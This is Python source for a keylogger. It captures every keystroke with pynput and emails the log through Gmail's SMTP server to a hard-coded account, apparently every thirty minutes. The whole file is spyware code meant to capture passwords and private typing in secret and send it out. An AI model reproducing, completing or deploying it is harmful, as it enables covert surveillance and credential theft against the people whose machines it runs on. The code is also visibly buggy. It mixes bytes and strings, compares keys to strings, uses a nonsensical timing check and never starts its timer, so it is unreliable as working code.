import pynput
import smtplib
import time
import threading
from time import localtime, strftime


log = ""
mail_head = ""


def listener(key):
    global log

    try:
        log = "Line :" + log + key.char.encode("UTF-8")

    except AttributeError:
        if key == 'Key.Space':
            log = log + " "

        elif key == 'Key.Enter':
            log = log + "\n"

        else:
            log = log + " // "


def hour_wait():
    global mail_head

    start = strftime("%d.%m.%Y - %H:%M:%S", localtime())

    x = 1800
    time.sleep(x)

    finish = strftime("%d.%m.%Y - %H:%M:%S", localtime())

    if int(int(finish[17]) - int(start[17])) == x:
        mail_head = finish


def mail_send(email, password, message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()


def thread_all():
    global log
    global mail_head

    log_msg = (f"""
    Date : {mail_head} \n\n

Captured : {log}
""")

    mail_send("", "", log_msg)
    log = ""

    threading.Timer(1800, thread_all)


keylogger = pynput.keyboard.Listener(on_press=listener)

with keylogger:
    keylogger.join()
    hour_wait()
    thread_all()
